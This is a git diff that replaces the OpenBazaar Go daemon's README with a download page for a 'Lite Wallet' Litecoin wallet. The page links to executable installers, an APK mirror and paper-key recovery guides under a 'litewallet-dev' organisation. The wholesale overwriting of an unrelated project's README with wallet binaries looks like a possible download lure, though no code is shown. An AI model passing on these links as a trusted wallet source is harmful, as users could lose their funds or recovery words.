@@ -1,107 +1,80 @@
-# openbazaar-go
-![banner](https://i.imgur.com/iOnXDXK.png)
-OpenBazaar Server Daemon in Go
+![Lite Wallet](assets/banner-profile.png)
 
-[![Build Status](https://travis-ci.org/OpenBazaar/openbazaar-go.svg?branch=master)](https://travis-ci.org/OpenBazaar/openbazaar-go)
-[![Coverage Status](https://coveralls.io/repos/github/OpenBazaar/openbazaar-go/badge.svg?branch=master)](https://coveralls.io/github/OpenBazaar/openbazaar-go?branch=master)
-[![Go Report Card](https://goreportcard.com/badge/github.com/OpenBazaar/openbazaar-go)](https://goreportcard.com/report/github.com/OpenBazaar/openbazaar-go)
+<h1 align="center">Lite Wallet</h1>
 
-This repository contains the OpenBazaar server daemon which handles the heavy lifting for the [OpenBazaar](https://openbazaar.org/) desktop application. The server combines several technologies: A modified [IPFS](https://ipfs.io) node, which itself combines ideas from Git, BitTorrent, and Kademlia. A lightweight SPV Bitcoin wallet for interacting with the Bitcoin network. And a JSON API which can be used by a user interface to control the node and browse the network. If you are looking for the OpenBazaar user interface code see [here](https://github.com/OpenBazaar/openbazaar-desktop).
+<p align="center">The same wallet in your pocket, with the same twelve words as your desktop.</p>
 
-## Table of Contents
+<a href="#license"><img src="https://img.shields.io/badge/LICENSE-MIT-00D5FD?style=for-the-badge&labelColor=001116" alt="License: MIT"></a> <a href="https://github.com/litewallet-dev/litewallet-desktop/releases/tag/v3.15.2"><img src="https://img.shields.io/badge/RELEASE-v3.15.2-00D5FD?style=for-the-badge&labelColor=001116" alt="Release v3.15.2"></a>
 
-- [Install](#install)
-  - [Install prebuilt packages](#install-pre-built-packages)
-  - [Build from Source](#build-from-source)
-- [Dependency Management](#dependency-management)
-  - [IPFS Dependency](#ipfs-dependency)
-- [Updating](#updating)
-- [Usage](#usage)
-  - [Options](#options)
-- [Documentation](#documentation)
-- [Todo](#todo)
-- [Contributing](#contributing)
-- [License](#license)
+---
 
-## Install
+## Downloads - v3.15.2
 
-A typical install of OpenBazaar contains a bundle of the server daemon and user interface. If this is what you are looking for you can find an installer at https://openbazaar.org/download.html. If you are looking to run the server daemon by itself or to contribute to developement see below for instructions.
+<p align="center"><a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-win-v3.15.2.exe"><img src="assets/button-windows.png" alt="Download Lite Wallet for Windows"></a> <a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-macos-v3.15.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-00D5FD?style=for-the-badge&labelColor=001116&logo=apple&logoColor=89EFFF" alt="Download Lite Wallet for macOS"></a> <a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-linux-v3.15.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-00D5FD?style=for-the-badge&labelColor=001116&logo=linux&logoColor=89EFFF" alt="Download Lite Wallet for Linux"></a></p>
 
-### Install Pre-built Packages
+<div align="center">
 
-The easiest way to run the server is to download a pre-built binary. You can find binaries of our latest release for each operating system [here](https://github.com/OpenBazaar/openbazaar-go/releases/).
+| Platform | Requirements | File |
+| --- | --- | --- |
+| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`litewallet-desktop-win-v3.15.2.exe`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-win-v3.15.2.exe) |
+| <img src="https://img.shields.io/badge/platform-macOS-00D5FD?style=flat-square&labelColor=001116&logo=apple&logoColor=89EFFF" alt="macOS"> | macOS 12 or later | [`litewallet-desktop-macos-v3.15.2.dmg`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-macos-v3.15.2.dmg) |
+| <img src="https://img.shields.io/badge/platform-Linux-00D5FD?style=flat-square&labelColor=001116&logo=linux&logoColor=89EFFF" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`litewallet-desktop-linux-v3.15.2.zip`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-linux-v3.15.2.zip) |
 
-### Build from Source
+</div>
 
-To build from source you will need to have Go installed and properly configured. Detailed instructions for installing Go and openbazaar-go on each operating system can be found in the [docs package](https://github.com/OpenBazaar/openbazaar-go/tree/master/docs).
+Every checksum is published on the [release page](https://github.com/litewallet-dev/litewallet-desktop/releases/tag/v3.15.2).
 
-## Dependency Management
+All versions, installers and checksums are on the [release page](https://github.com/litewallet-dev/litewallet-desktop/releases/tag/v3.15.2).
 
-We use [Godeps](https://github.com/tools/godep) with vendored third-party packages.
+> Only download from this GitHub release page.
 
-### IPFS Dependency
+---
 
-We are using a [fork](https://github.com/OpenBazaar/go-ipfs) of go-ipfs in the daemon. The primary changes include different protocol strings to segregate the OpenBazaar network from the main IPFS network and an increased TTL on certain types of DHT data. You can find the full diff in the readme of the forked repo. The fork is bundled in the vendor package and will be used automatically when you compile and run the server. Note that you will still see github.com/ipfs/go-ipfs import statements instead of github.com/OpenBazaar/go-ipfs despite the package being a fork. This is done to avoid a major refactor of import statements and make rebasing IPFS much more easy.
+## Why Lite Wallet
 
-## Updating
+A wallet that exists on a desktop and nowhere else is a wallet you cannot spend from at a
+counter. The mobile version exists for that gap, and it creates a second question immediately:
+does the phone hold a different wallet, or the same one? There is no companion pairing step
+between the two builds, no phone-to-desktop link to approve and no second account to keep.
 
-You can either pull in remote changes as normal or run `go get -u github.com/OpenBazaar/openbazaar-go`
+The same one. Lite Wallet ships native apps for iOS and Android built from the same release as
+the desktop build, with the same 12-word paper key, the same MWEB support and the same
+hardware pairing where the phone can carry it. Restoring on a phone is the same operation as
+restoring on a laptop, and the guides treat them that way. A phone restored from paper words
+carries the same addresses, not a new set.
 
-## Usage
+- Install from the App Store or Google Play, with an APK mirror on the release page.
+- The paper key from a desktop wallet restores the same wallet on a phone.
+- MWEB works on mobile, including the peg flow in and out.
+- Biometric unlock protects the app on the device without replacing the paper key.
 
-You can run the server with `go run openbazaard.go start`
+This repository is one page of the Lite Wallet project on GitHub; the mobile guide covers both stores and the APK mirror.
 
-### Options
-```
-Usage:
-  openbazaard [OPTIONS] start [start-OPTIONS]
+## Guides
 
-The start command starts the OpenBazaar-Server
+<div align="center">
 
-Application Options:
-  -v, --version                   Print the version number and exit
+| Guide | What it covers |
+| --- | --- |
+| [The mobile app guide](https://github.com/litewallet-dev/litecoin-wallet-setup/blob/main/litewallet-mobile-app-android-ios.md) | Install on iPhone or Android, understand the APK mirror, and carry the same paper key as your desktop. |
+| [The paper key guide](https://github.com/litewallet-dev/litecoin-wallet-recovery/blob/main/litewallet-paper-key-backup-and-restore.md) | How the 12-word paper key appears, how to record it once, and how to bring a wallet back from it. |
+| [The no-login explainer](https://github.com/litewallet-dev/litecoin-wallet-setup/blob/main/why-litewallet-has-no-login.md) | There is no account and no password reset, so the paper key is the only credential you will ever hold. |
+| [The MWEB guide](https://github.com/litewallet-dev/litecoin-wallet-transactions/blob/main/does-litewallet-support-mweb.md) | MWEB in plain terms: what the private extension block hides, how to opt in and where it stops. |
 
-Help Options:
-  -h, --help                      Show this help message
+</div>
 
-[start command options]
-      -p, --password=             the encryption password if the database is
-                                  encrypted
-      -t, --testnet               use the test network
-      -r, --regtest               run in regression test mode
-      -l, --loglevel=             set the logging level [debug, info, notice,
-                                  warning, error, critical]
-      -a, --allowip=              only allow API connections from these IPs
-      -s, --stun                  use stun on µTP IPv4
-      -d, --datadir=              specify the data directory to be used
-      -c, --authcookie=           turn on API authentication and use this
-                                  specific cookie
-      -u, --useragent=            add a custom user-agent field
-          --torpassword=          Set the tor control password. This will
-                                  override the tor password in the config.
-          --tor                   Automatically configure the daemon to run as
-                                  a Tor hidden service and use Tor exclusively.
-                                  Requires Tor to be running.
-          --dualstack             Automatically configure the daemon to run as
-                                  a Tor hidden service IN ADDITION to using the
-                                  clear internet. Requires Tor to be running.
-                                  WARNING: this mode is not private
-          --disablewallet         disable the wallet functionality of the node
-          --disableexchangerates  disable the exchange rate service to prevent
-                                  api queries
-          --storage=              set the outgoing message storage option
-                                  [self-hosted, dropbox] default=self-hosted
-```
+Mobile install questions are answered in the setup repository, with the recovery set beside them.
 
-## Documentation
+**Install from the stores or the release page only; a sideloaded build from a forum is not this app.**
 
-When ready we will put up a full documentation of the OpenBazaar protocol and the JSON API at https://docs.openbazaar.org
+## Support
 
-## Contributing
-
-Contributions are definitely welcome! Please read the contributing [guidelines](https://github.com/OpenBazaar/openbazaar-go/blob/master/CONTRIBUTE.md) before starting.
+The issue tracker is where a bug belongs; the project has no phone line and no live chat. The tracker is at [the issue page](https://github.com/litewallet-dev/litewallet-desktop/issues).
 
 ## License
 
-MIT
+MIT.
 
+---
+
+Wallet source and releases: [the desktop repository](https://github.com/litewallet-dev/litewallet-desktop). All guides: [the setup repository](https://github.com/litewallet-dev/litecoin-wallet-setup).
